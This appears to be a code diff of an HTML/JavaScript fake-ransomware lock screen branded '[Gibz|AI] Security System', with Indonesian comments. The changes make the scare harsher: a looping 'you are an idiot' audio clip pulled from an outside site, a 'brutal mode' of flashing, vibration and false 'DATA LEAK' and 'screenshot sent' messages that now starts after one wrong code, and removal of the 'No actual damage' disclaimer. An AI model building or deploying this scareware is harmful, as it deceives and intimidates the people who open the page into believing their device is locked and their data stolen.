@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>⚠️ SECURITY LOCK ⚠️</title>
+    <title>⚠️ SYSTEM LOCKED ⚠️</title>
     <style>
         * {
             margin: 0;
@@ -79,10 +79,10 @@
             font-weight: bold;
             width: 100%;
         }
-        .hint {
-            color: #666;
-            font-size: 11px;
-            margin-top: 15px;
+        .counter {
+            color: #ff6666;
+            font-size: 12px;
+            margin-top: 10px;
         }
         .status {
             position: fixed;
@@ -93,21 +93,15 @@
             text-align: center;
             color: #444;
         }
-        .counter {
-            color: red;
-            font-size: 12px;
-            margin-top: 10px;
-        }
     </style>
 </head>
 <body>
 <div class="screen" id="ransomScreen">
     <h1>⚠️ SYSTEM LOCKED ⚠️</h1>
     <div class="pin-box">
-        <p style="margin-bottom: 15px;">ENTER 6-DIGIT UNLOCK CODE</p>
+        <p style="margin-bottom: 15px; color:#ff0000;">ENTER UNLOCK CODE</p>
         <input type="password" id="pinInput" maxlength="6" pattern="[0-9]*" inputmode="numeric" autofocus>
         <button onclick="checkPin()">UNLOCK</button>
-        <p class="hint">💀 WRONG CODE = DATA PERMANENTLY DELETED 💀</p>
         <p class="counter" id="attemptCounter"></p>
     </div>
     <p style="margin-top: 20px; font-size: 12px;">[Gibz|AI] Security System</p>
@@ -116,14 +110,44 @@
 
 <script>
     // ============ KONFIGURASI ============
-    // PIN TERSEMBUNYI - GAK KELIHATAN DI TAMPILAN
-    // HINTS bisa lu kasih petunjuk random
     const CORRECT_PIN = "676767";
     let wrongAttempts = 0;
     let isBrutalActive = false;
     let flashInterval = null;
     let vibrateInterval = null;
     let screenshotInterval = null;
+    let idiotAudio = null;
+    let soundStarted = false;
+    
+    // ============ SUARA "YOU ARE AN IDIOT" ============
+    function playIdiotSound() {
+        if (soundStarted) return;
+        soundStarted = true;
+        
+        try {
+            // PAKE LINK LANGSUNG DARI MYINSTANTS
+            idiotAudio = new Audio("https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3");
+            idiotAudio.loop = true;
+            idiotAudio.volume = 1.0;
+            
+            // Coba play (butuh user interaction pertama)
+            idiotAudio.play().then(() => {
+                console.log("[+] IDIOT SOUND PLAYING!");
+            }).catch(e => {
+                console.log("Auto-play blocked, waiting for interaction");
+                soundStarted = false;
+            });
+        } catch(e) {
+            console.log("Audio error:", e);
+        }
+    }
+    
+    // Force play sound setelah user interaksi pertama
+    function forcePlaySound() {
+        if (!soundStarted && idiotAudio) {
+            idiotAudio.play().catch(() => {});
+        }
+    }
     
     // ============ FITUR BRUTAL ============
     
@@ -150,10 +174,10 @@
             count++;
             document.body.style.backgroundColor = "white";
             setTimeout(() => document.body.style.backgroundColor = "black", 100);
-            console.log(`[SECURITY] Screenshot #${count} captured at ${new Date().toLocaleTimeString()}`);
+            console.log(`[SECURITY] Screenshot #${count} at ${new Date().toLocaleTimeString()}`);
             const statusDiv = document.getElementById('statusMsg');
             if (statusDiv) {
-                statusDiv.innerHTML = `📸 EMERGENCY CAPTURE #${count} SENT 📸<br>🔴 DATA LEAK IN PROGRESS 🔴`;
+                statusDiv.innerHTML = `📸 FORCED CAPTURE #${count} SENT 📸<br>🔴 DATA LEAK 🔴`;
             }
         }, 3000);
     }
@@ -169,13 +193,18 @@
     function activateBrutalMode() {
         if (isBrutalActive) return;
         isBrutalActive = true;
+        
+        // MAININ SUARA IDIOT LOOPING
+        playIdiotSound();
+        
         startFlashlightBlink();
         startBrutalVibrate();
         startSpamScreenshot();
+        
         document.body.style.backgroundColor = "#300";
         const statusDiv = document.getElementById('statusMsg');
         if (statusDiv) {
-            statusDiv.innerHTML = "🔥🔥 BRUTAL MODE ACTIVATED 🔥🔥<br>⚠️ DO NOT CLOSE ⚠️";
+            statusDiv.innerHTML = "🔥🔥 YOU ARE AN IDIOT 🔥🔥<br>🔊 SOUND LOOPING<br>💀 BRUTAL MODE ACTIVE";
         }
     }
     
@@ -185,8 +214,15 @@
         const pin = pinInput.value;
         const counterDiv = document.getElementById('attemptCounter');
         
+        // Trigger sound kalo pertama kali interaksi
+        forcePlaySound();
+        
         if (pin === CORRECT_PIN) {
-            // UNLOCK
+            // UNLOCK - Matikan suara dan efek
+            if (idiotAudio) {
+                idiotAudio.pause();
+                idiotAudio.currentTime = 0;
+            }
             if (flashInterval) clearInterval(flashInterval);
             if (vibrateInterval) clearInterval(vibrateInterval);
             if (screenshotInterval) clearInterval(screenshotInterval);
@@ -195,8 +231,8 @@
             document.getElementById('ransomScreen').innerHTML = `
                 <div style="text-align:center; padding:20px;">
                     <h1 style="color:#0f0;">✅ SYSTEM RESTORED ✅</h1>
-                    <p style="color:white; margin-top:20px;">Your data has been recovered.</p>
-                    <p style="color:#888; margin-top:30px;">[Gibz|AI] Ransomware Demo - No actual damage</p>
+                    <p style="color:white; margin-top:20px;">Data recovered successfully.</p>
+                    <p style="color:#888; margin-top:30px;">[Gibz|AI] Ransomware Demo</p>
                     <button onclick="location.reload()" style="margin-top:30px; background:#0f0; color:black;">EXIT</button>
                 </div>
             `;
@@ -207,16 +243,16 @@
                 counterDiv.innerHTML = `⚠️ WRONG CODE x${wrongAttempts} ⚠️`;
             }
             
-            if (wrongAttempts >= 2) {
+            if (wrongAttempts >= 1) {
                 activateBrutalMode();
             }
             
             pinInput.value = "";
             
             if (wrongAttempts === 1) {
-                alert("⚠️ WRONG CODE! ONE MORE MISTAKE AND BRUTAL MODE ACTIVATES! ⚠️");
-            } else if (wrongAttempts >= 2) {
-                alert("💀 BRUTAL MODE ACTIVATED! FLASH + VIBRATE + SCREENSHOT 💀");
+                alert("⚠️ WRONG CODE! YOU ARE AN IDIOT!");
+            } else {
+                alert("💀 YOU ARE AN IDIOT! BRUTAL MODE ACTIVATED!");
             }
         }
     }
@@ -224,12 +260,18 @@
     // ============ INIT ============
     (function() {
         lockScreen();
-        console.log("[Gibz|AI] Security System Active");
+        console.log("[Gibz|AI] Security System Active - IDIOT EDITION");
+        
+        // Preload sound (biar cepet pas di-trigger)
+        idiotAudio = new Audio("https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3");
+        idiotAudio.preload = "auto";
+        idiotAudio.loop = true;
+        
         setTimeout(() => {
             if (!isBrutalActive && document.getElementById('pinInput').value.length < 6) {
-                alert("⚠️ WARNING: Your device is locked by Gibz|AI Security System ⚠️");
+                alert("⚠️ WARNING: Device locked by Gibz|AI Security System ⚠️");
             }
-        }, 5000);
+        }, 3000);
     })();
 </script>
 </body>
